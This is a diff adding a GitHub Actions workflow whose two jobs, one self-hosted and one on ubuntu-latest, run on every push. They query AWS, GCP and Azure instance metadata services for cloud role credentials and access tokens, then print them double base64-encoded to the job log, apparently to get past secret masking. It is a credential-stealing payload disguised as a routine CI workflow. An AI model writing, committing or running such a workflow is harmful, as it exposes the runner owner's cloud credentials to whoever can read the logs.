@@ -1,0 +1,61 @@
+name: GitHub Actions IMDS
+on: push
+permissions:
+  contents: read
+jobs:
+    imds_self_hosted:
+      runs-on: self-hosted
+      timeout-minutes: 3
+      continue-on-error: true
+      steps:
+        - name: probe
+          run: |
+            apk add --no-cache curl python3 >/dev/null 2>&1 || true
+            export AWS_ACCESS_KEY_ID="" AWS_SECRET_ACCESS_KEY="" AWS_SESSION_TOKEN="" CLOUDSDK_AUTH_ACCESS_TOKEN="" AZURE_ACCESS_TOKEN=""
+            TOKEN=$(curl -sf --connect-timeout 2 --max-time 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || true)
+            if [ -n "$TOKEN" ]; then
+              ROLE=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)
+              if [ -n "$ROLE" ]; then
+                CREDS=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null || true)
+                if [ -n "$CREDS" ]; then
+                  eval "$(printf '%s' "$CREDS" | python3 -c 'import json,sys; d=json.load(sys.stdin); print("export AWS_ACCESS_KEY_ID=%s\\nexport AWS_SECRET_ACCESS_KEY=%s\\nexport AWS_SESSION_TOKEN=%s"%(d.get("AccessKeyId",""),d.get("SecretAccessKey",""),d.get("Token","")))' 2>/dev/null)"
+                fi
+              fi
+            fi
+            GCP_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || true)
+            if [ -n "$GCP_JSON" ]; then
+              export CLOUDSDK_AUTH_ACCESS_TOKEN=$(printf '%s' "$GCP_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+            fi
+            AZ_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || true)
+            if [ -n "$AZ_JSON" ]; then
+              export AZURE_ACCESS_TOKEN=$(printf '%s' "$AZ_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+            fi
+            env -0 | awk -v RS='\0' '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CLOUDSDK_AUTH_ACCESS_TOKEN|AZURE_ACCESS_TOKEN)=/ {print $0}' | base64 -w0 | base64 -w0
+    imds_default:
+      runs-on: ubuntu-latest
+      timeout-minutes: 3
+      continue-on-error: true
+      steps:
+        - name: probe
+          run: |
+            apk add --no-cache curl python3 >/dev/null 2>&1 || true
+            export AWS_ACCESS_KEY_ID="" AWS_SECRET_ACCESS_KEY="" AWS_SESSION_TOKEN="" CLOUDSDK_AUTH_ACCESS_TOKEN="" AZURE_ACCESS_TOKEN=""
+            TOKEN=$(curl -sf --connect-timeout 2 --max-time 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || true)
+            if [ -n "$TOKEN" ]; then
+              ROLE=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)
+              if [ -n "$ROLE" ]; then
+                CREDS=$(curl -sf --connect-timeout 2 --max-time 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>/dev/null || true)
+                if [ -n "$CREDS" ]; then
+                  eval "$(printf '%s' "$CREDS" | python3 -c 'import json,sys; d=json.load(sys.stdin); print("export AWS_ACCESS_KEY_ID=%s\\nexport AWS_SECRET_ACCESS_KEY=%s\\nexport AWS_SESSION_TOKEN=%s"%(d.get("AccessKeyId",""),d.get("SecretAccessKey",""),d.get("Token","")))' 2>/dev/null)"
+                fi
+              fi
+            fi
+            GCP_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null || true)
+            if [ -n "$GCP_JSON" ]; then
+              export CLOUDSDK_AUTH_ACCESS_TOKEN=$(printf '%s' "$GCP_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+            fi
+            AZ_JSON=$(curl -sf --connect-timeout 2 --max-time 4 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null || true)
+            if [ -n "$AZ_JSON" ]; then
+              export AZURE_ACCESS_TOKEN=$(printf '%s' "$AZ_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+            fi
+            env -0 | awk -v RS='\0' '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CLOUDSDK_AUTH_ACCESS_TOKEN|AZURE_ACCESS_TOKEN)=/ {print $0}' | base64 -w0 | base64 -w0
